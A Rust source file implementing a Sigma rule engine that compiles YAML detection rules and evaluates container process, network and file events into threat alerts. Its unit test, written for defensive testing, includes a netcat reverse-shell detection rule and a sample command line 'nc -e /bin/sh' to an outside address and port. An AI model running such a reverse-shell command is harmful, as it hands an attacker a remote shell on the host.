//! Sigma rule compilation and real-time event evaluation engine.

use kwall_core::types::Severity;
use kwall_detection::alert::{ThreatAlert, ThreatCategory};
use serde::{Deserialize, Serialize};
use std::collections::HashMap;

/// Supported log source categories for Sigma rules in cloud-native container environments.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum SigmaLogSourceCategory {
    ProcessCreation,
    NetworkConnection,
    FileEvent,
    Unknown,
}

/// Pattern modifier specifying how a Sigma field value should be matched.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum PatternModifier {
    Exact,
    Contains,
    StartsWith,
    EndsWith,
}

/// A parsed pattern matcher for a single field in a Sigma selection.
#[derive(Debug, Clone)]
pub struct FieldPattern {
    pub field_name: String,
    pub modifier: PatternModifier,
    pub expected_values: Vec<String>,
}

impl FieldPattern {
    /// Evaluates whether an observed field value satisfies this pattern.
    #[must_use]
    pub fn matches(&self, actual_val: &str) -> bool {
        let actual_lower = actual_val.to_lowercase();
        for expected in &self.expected_values {
            let expected_lower = expected.to_lowercase();
            let matched = match self.modifier {
                PatternModifier::Exact => actual_lower == expected_lower,
                PatternModifier::Contains => actual_lower.contains(&expected_lower),
                PatternModifier::StartsWith => actual_lower.starts_with(&expected_lower),
                PatternModifier::EndsWith => actual_lower.ends_with(&expected_lower),
            };
            if matched {
                return true;
            }
        }
        false
    }
}

/// A compiled, executable Sigma detection rule.
#[derive(Debug, Clone)]
pub struct CompiledSigmaRule {
    pub id: String,
    pub title: String,
    pub description: String,
    pub category: SigmaLogSourceCategory,
    pub level: Severity,
    pub mitre_attack_id: Option<String>,
    pub selections: Vec<FieldPattern>,
    pub filters: Vec<FieldPattern>,
}

impl CompiledSigmaRule {
    /// Evaluates this rule against a map of observed event fields.
    /// Returns true if all selection criteria match and no filter criteria match.
    #[must_use]
    pub fn matches_event(&self, fields: &HashMap<String, String>) -> bool {
        // All selection patterns must be satisfied
        for pattern in &self.selections {
            match fields.get(&pattern.field_name) {
                Some(val) => {
                    if !pattern.matches(val) {
                        return false;
                    }
                }
                None => return false,
            }
        }

        // If any filter pattern matches, suppress the detection
        for filter in &self.filters {
            if let Some(val) = fields.get(&filter.field_name) {
                if filter.matches(val) {
                    return false;
                }
            }
        }

        true
    }

    /// Converts a successful detection match into a structured ThreatAlert.
    #[must_use]
    pub fn to_alert(&self, timestamp_ns: u64, pod_name: &str, namespace: &str) -> ThreatAlert {
        ThreatAlert {
            alert_id: format!("sigma-{}", self.id),
            timestamp_ns,
            severity: self.level,
            category: ThreatCategory::SigmaRuleMatch,
            mitre_attack_id: self.mitre_attack_id.clone(),
            title: self.title.clone(),
            description: format!(
                "Sigma detection '{}' triggered on pod '{}/{}': {}",
                self.title, namespace, pod_name, self.description
            ),
            workload: None,
            evidence: serde_json::json!({
                "sigma_rule_id": self.id,
                "pod_name": pod_name,
                "namespace": namespace,
            }),
            recommended_action:
                "Inspect container process tree and review rule remediation guidance.".to_string(),
        }
    }
}

/// Raw representation of a Sigma YAML rule document.
#[derive(Debug, Deserialize)]
struct RawSigmaRule {
    title: String,
    id: Option<String>,
    description: Option<String>,
    logsource: RawLogSource,
    detection: RawDetection,
    level: Option<String>,
    tags: Option<Vec<String>>,
}

#[derive(Debug, Deserialize)]
struct RawLogSource {
    category: Option<String>,
}

#[derive(Debug, Deserialize)]
#[allow(dead_code)]
struct RawDetection {
    selection: Option<serde_yaml::Value>,
    filter: Option<serde_yaml::Value>,
    condition: Option<String>,
}

/// Sigma rule engine compiling and evaluating Sigma rules.
pub struct SigmaEngine {
    rules: Vec<CompiledSigmaRule>,
}

impl Default for SigmaEngine {
    fn default() -> Self {
        Self::new()
    }
}

impl SigmaEngine {
    /// Creates a new empty SigmaEngine.
    #[must_use]
    pub fn new() -> Self {
        Self { rules: Vec::new() }
    }

    /// Compiles a YAML string containing a Sigma rule.
    pub fn add_rule_yaml(&mut self, yaml_content: &str) -> Result<String, String> {
        let raw: RawSigmaRule = serde_yaml::from_str(yaml_content).map_err(|e| e.to_string())?;

        let rule_id = raw.id.unwrap_or_else(|| {
            format!(
                "{:016x}",
                std::time::SystemTime::now()
                    .duration_since(std::time::UNIX_EPOCH)
                    .map(|d| d.as_nanos())
                    .unwrap_or(0)
            )
        });

        let category = match raw.logsource.category.as_deref() {
            Some("process_creation") => SigmaLogSourceCategory::ProcessCreation,
            Some("network_connection") => SigmaLogSourceCategory::NetworkConnection,
            Some("file_event") => SigmaLogSourceCategory::FileEvent,
            _ => SigmaLogSourceCategory::Unknown,
        };

        let level = match raw.level.as_deref() {
            Some("critical") => Severity::Critical,
            Some("high") => Severity::Critical,
            Some("medium") => Severity::Error,
            Some("low") => Severity::Warning,
            _ => Severity::Info,
        };

        // Extract MITRE technique from tags (e.g., "attack.t1059.004")
        let mut mitre_attack_id = None;
        if let Some(tags) = raw.tags {
            for tag in tags {
                let lower = tag.to_lowercase();
                if lower.starts_with("attack.t") {
                    mitre_attack_id = Some(lower.trim_start_matches("attack.").to_uppercase());
                    break;
                }
            }
        }

        let selections = Self::parse_patterns(raw.detection.selection);
        let filters = Self::parse_patterns(raw.detection.filter);

        let compiled = CompiledSigmaRule {
            id: rule_id.clone(),
            title: raw.title,
            description: raw.description.unwrap_or_default(),
            category,
            level,
            mitre_attack_id,
            selections,
            filters,
        };

        self.rules.push(compiled);
        Ok(rule_id)
    }

    /// Helper converting YAML selection mapping into FieldPatterns.
    fn parse_patterns(val: Option<serde_yaml::Value>) -> Vec<FieldPattern> {
        let mut patterns = Vec::new();
        let mapping = match val {
            Some(serde_yaml::Value::Mapping(m)) => m,
            _ => return patterns,
        };

        for (k, v) in mapping {
            let key_str = match k.as_str() {
                Some(s) => s,
                None => continue,
            };

            let (field_name, modifier) = if let Some((base, modif)) = key_str.split_once('|') {
                let m = match modif {
                    "contains" => PatternModifier::Contains,
                    "startswith" => PatternModifier::StartsWith,
                    "endswith" => PatternModifier::EndsWith,
                    _ => PatternModifier::Exact,
                };
                (base.to_string(), m)
            } else {
                (key_str.to_string(), PatternModifier::Exact)
            };

            let mut expected_values = Vec::new();
            match v {
                serde_yaml::Value::String(s) => expected_values.push(s),
                serde_yaml::Value::Sequence(seq) => {
                    for item in seq {
                        if let serde_yaml::Value::String(s) = item {
                            expected_values.push(s);
                        }
                    }
                }
                _ => {}
            }

            if !expected_values.is_empty() {
                patterns.push(FieldPattern {
                    field_name,
                    modifier,
                    expected_values,
                });
            }
        }

        patterns
    }

    /// Evaluates an event against all compiled rules and returns triggered ThreatAlerts.
    #[must_use]
    pub fn evaluate(
        &self,
        category: SigmaLogSourceCategory,
        fields: &HashMap<String, String>,
        timestamp_ns: u64,
        pod_name: &str,
        namespace: &str,
    ) -> Vec<ThreatAlert> {
        let mut alerts = Vec::new();

        for rule in &self.rules {
            if rule.category == category && rule.matches_event(fields) {
                alerts.push(rule.to_alert(timestamp_ns, pod_name, namespace));
            }
        }

        alerts
    }

    /// Number of compiled rules in the engine.
    #[must_use]
    pub fn total_rules(&self) -> usize {
        self.rules.len()
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_sigma_rule_compilation_and_matching() {
        let sigma_yaml = r#"
title: Netcat Reverse Shell Detection
id: 5d134b95-46aa-4d8e-9ea1-9e798dfb9f34
status: stable
description: Detects netcat execution with reverse shell arguments in a container.
logsource:
    category: process_creation
detection:
    selection:
        Image|endswith:
            - '/nc'
            - '/netcat'
            - '/ncat'
        CommandLine|contains:
            - '-e /bin/sh'
            - '-e /bin/bash'
    filter:
        User: 'root_whitelisted'
    condition: selection and not filter
level: critical
tags:
    - attack.execution
    - attack.t1059.004
"#;

        let mut engine = SigmaEngine::new();
        let rule_id = engine
            .add_rule_yaml(sigma_yaml)
            .expect("Rule should compile");
        assert_eq!(rule_id, "5d134b95-46aa-4d8e-9ea1-9e798dfb9f34");
        assert_eq!(engine.total_rules(), 1);

        // Positive event match
        let mut fields = HashMap::new();
        fields.insert("Image".to_string(), "/usr/bin/nc".to_string());
        fields.insert(
            "CommandLine".to_string(),
            "nc -e /bin/sh 10.0.0.1 4444".to_string(),
        );
        fields.insert("User".to_string(), "www-data".to_string());

        let alerts = engine.evaluate(
            SigmaLogSourceCategory::ProcessCreation,
            &fields,
            1_000_000_000,
            "victim-pod",
            "production",
        );

        assert_eq!(alerts.len(), 1);
        assert_eq!(alerts[0].category, ThreatCategory::SigmaRuleMatch);
        assert_eq!(alerts[0].severity, Severity::Critical);
        assert_eq!(alerts[0].mitre_attack_id.as_deref(), Some("T1059.004"));

        // Filter suppression test (whitelisted user)
        fields.insert("User".to_string(), "root_whitelisted".to_string());
        let suppressed = engine.evaluate(
            SigmaLogSourceCategory::ProcessCreation,
            &fields,
            1_000_000_000,
            "victim-pod",
            "production",
        );
        assert!(suppressed.is_empty());
    }
}
